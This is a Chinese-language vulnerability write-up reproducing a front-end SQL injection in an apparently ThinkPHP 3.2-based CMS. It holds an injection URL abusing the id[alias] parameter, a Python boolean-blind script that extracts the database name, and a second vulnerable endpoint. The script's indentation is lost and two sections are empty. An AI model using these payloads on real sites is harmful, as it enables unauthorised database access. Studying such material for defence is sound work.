### 一、漏洞简介 ###

### 二、漏洞影响 ###

### 三、复现过程 ###

漏洞起始点位于/Application/Home/Controller/NewsController.class.php中的index方法，代码如下
![](前台sql注入(一)/TzJ74lFNKmtjurv.png)
在代码第六行调用了News模型中的detail方法，跟进该方法
![](前台sql注入(一)/kMGtey315nKcY9f.png)
可以看到在第八行进而调用了tp的find方法，在该版本中find方法是可以进行注入的，同时参数$id是我们可控的，首先我们来看一下正常的输入情况(图中域名为本地搭建解析)
![](前台sql注入(一)/FQqP2YrzCc6inag.png)

根据tp3.2的注入点构造一下语句，访问如下链接

    http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and 1--
页面与正常访问相比没有变化，查看一下数据库日志，看下后端数据库语句
![](前台sql注入(一)/OuVPDIbdgk7Zfja.png)

可以看到在id处已经可以进行sql语句的拼接，也就证明该处是存在可利用的注入点的，由于本套程序对于错误信息是有屏蔽的，在这里我们很难利用报错注入带出数据，在该处可以考虑使用布尔类型的盲注，两种回显状态如下
![](前台sql注入(一)/J8eYIvElUjLXsku.png)
![](前台sql注入(一)/OVqDUbNIlydY3w7.png)
接着写一下脚本（以查询数据库名为例）
    
    import requests
    url = 'http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and '
    result = ''
    for i in range(1,50):
    print('-----------------------------')
    for j in range(32,127):
    payload = 'if((ascii(substr((select database()),{},1))={}),1,0)--'.format(i,j)
    temp = url+payload
    try:
    html = requests.get(temp,timeout=10)
    if 'tttest' in html.text:
    result+=chr(j)
    print(result)
    break
    except:
    print('[-]error')
结果如下
![](前台sql注入(一)/vRt2Zxjw4N3ubl7.png)
相同原理的利用点还有很多，如位于/Application/Home/Controller/MovieController.class.php中的index方法的id参数，这里就不再重复分析了

### 参考链接 ###
https://xz.aliyun.com/t/7844